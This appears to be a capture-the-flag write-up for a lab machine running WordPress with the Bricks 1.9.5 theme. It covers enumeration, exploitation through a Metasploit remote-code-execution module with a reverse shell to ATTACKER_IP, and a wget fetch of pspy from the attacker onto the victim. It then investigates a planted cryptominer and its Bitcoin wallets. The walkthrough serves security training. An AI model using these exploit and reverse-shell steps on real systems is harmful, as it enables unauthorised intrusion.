# Scenario

From Three Million Bricks to Three Million Transactions!

Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.

Can you hack back the server and identify what happened there?

**Note**: Add `10.10.103.104 bricks.thm` to your `/etc/hosts` file.

# Enumeration

## \[+] 10.10.103.104 - bricks.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
sudo echo '10.10.75.38 bricks.thm' >> /etc/hosts
export RHOSTS=10.10.103.104
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 443 - HTTPS

### \[-] bricks.thm

This page looks pretty plain, so let's take a look at the source code. On line 41, we find that this web page is powered by WordPress:

![8742c1b44dfe99e70d19aae7b45ce2c5.png](/resources/648f938e1c364089be766f0959ddc783.png)

We can use a tool like [WPScan](https://github.com/wpscanteam/wpscan) to further enumerate the web site.

```sh
wpscan --url https://bricks.thm --disable-tls-checks
```

WPScan was able to find the theme and version (Bricks 1.9.5) that is running on WordPress:

# Initial Foothold

### \[-] apache\@tryhackme

Searching for "bricks 1.9.5 exploit" had many results which had working exploits. There is also a Metasploit module (`exploit/multi/http/wp_bricks_builder_rce`) which we can run using `msfconsole`:

```sh
msfconsole
search bricks
use 0
```

![c37ba150b5064022755b348f18469a0f.png](/resources/b21b938a7fa34ed7a3cf67d7e1fff566.png)

Now we type `options` and fill in the field using `set <OPTION> <VALUE>`. After configuring all the options, it should look similar to this:

```sh
options
set rhosts bricks.thm
set rport 443
set ssl true
set lhost <ATTACKER_IP>
```

![bd40fa39bc991d0efd405af14bacc7e1.png](/resources/d1018acecf5a4d048879fbd0414a9e43.png)

For the payload option, we'll use a normal TCP reverse shell and run the exploit. After a moment we'll receive a connection back to our reverse shell as the user `apache`:

```sh
set payload payload/generic/shell_reverse_tcp
run
```

We can stabilize the shell a bit using:

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then list the files in the current directory and get the first flag:

```sh
ls -lah
cat <FILENAME>.txt
```

For the next question, to enumerate the running processes on the victime machine, we'll need to use [pspy](https://github.com/DominicBreuker/pspy/releases) tool. On the attacker machine download the latest release 32-bit or 64-bit. Then use Python to host the file using:

```sh
python3 -m http.server 8888
```

Then on the victim machine, we move to the `/tmp` directory first before downloading pspy using `wget`. After the file has been downloaded, use `chmod` to make it executable and run it with `./pspy`:

```sh
cd /tmp
wget <ATTACKER_IP>:8888/pspy
chmod +x pspy
./pspy
```

We'll have to leave pspy running for a couple of minutes until we see the suspicious process towards the bottom of the log:

![f18b0a817525d43b224429cb6be549a3.png](/resources/ceb49600150c4d8cb5b1f213dc337d18.png)

After making not of the suspicious process, press `Ctrl + C` and then answer `N` when prompted to get back to the shell.

For the next question, we can list all the running services and look through the list for anything suspicious:

```sh
systemctl list-units --type=service --state=running
```

![cebbc76ee2bc4c7c82db12b1746b5b49.png](/resources/f052dfb92dfa405ca1c43fd3eb0d7c99.png)

For the last three questions, we will have to do some external research. First we can get the SHA-256 hash of the suspicious file using `sha256sum` and search for it on [VirusTotal](https://www.virustotal.com/gui/file/2d96bf6e392bbd29c2d13f6393410e4599a40e1f2fe9dc8a7b744d11f05eb756/detection):

```sh
sha256sum <SUSPICIOUS_FILE>
```

Under the "Behavior" tab, we scroll down and expand the "Files Written" section:

![bf67304e501522bb7693def8494aa7ae.png](/resources/e766b712f4b843798650dda8ba6d00cf.png)

![839cced10c76d807f259940b87cba48c.png](/resources/040d6628d5644b749a86464cf9b6c6d8.png)

If we print the contents of this file using `cat`, we'll find a log for a cryptocurrency miner:

![985a45ede0d5bdc55e07a81363fc8a89.png](/resources/6739445e2d444a6f8a1ae435e66e6369.png)

To find the wallet, we copy the long alphanumeric string next to "ID" from the logs, paste it into [CyberChef](https://gchq.github.io/CyberChef/#input=NTc1NzMxNGU2NTQ3NGU1OTYyNDg0YTRmNjU2ZDc4NzQ1NzU0NGU0MjRlNTc0NjQ4NTU1NDQ2Njg0ZDMwNzA3MzU5MzA2ODRiNjE2YzcwNTU1YTdhNTY2YjUyMzM1Mjc2NTQ2YjY4NmI2NTU3NTI0ODY0N2E1MjVhNTc0NjZmNzc1NDZiNjQzMzRkNmIzNDdhNTI2ZDY4NWE2MjU1MzEzNDU5MzE2ODczNjM2YjM1MzY2MjQ3MzE1YTRkMzA0NTMxNTk1NTY0NDc2MTMwMzU1ODY0NDg2YzYxNTc0NTRhMzU1NzU0NGE1NjRlNDUzOTU5NTU2ZTRhNjg1MjQ2NDk3YTU5MzIzNTUzNjMzMDM5NDg1MjZhNGE2YjUyNDY0YTdhNTQ2ZDcwNmI2NTQ2NmM1MjUwNTQzMDNk) and click on the magic wand icon:

After CyberChef has converted the string, it should start with `bc1` which indicates it's a Bitcoin address in Bech32 format. So there are actually two addresses here. Copy from `bc1` until you see `bc1` which indicates the start of the next address.

For the last question, we can search this Bitcoin address and find articles related to the people responsible for the malware.
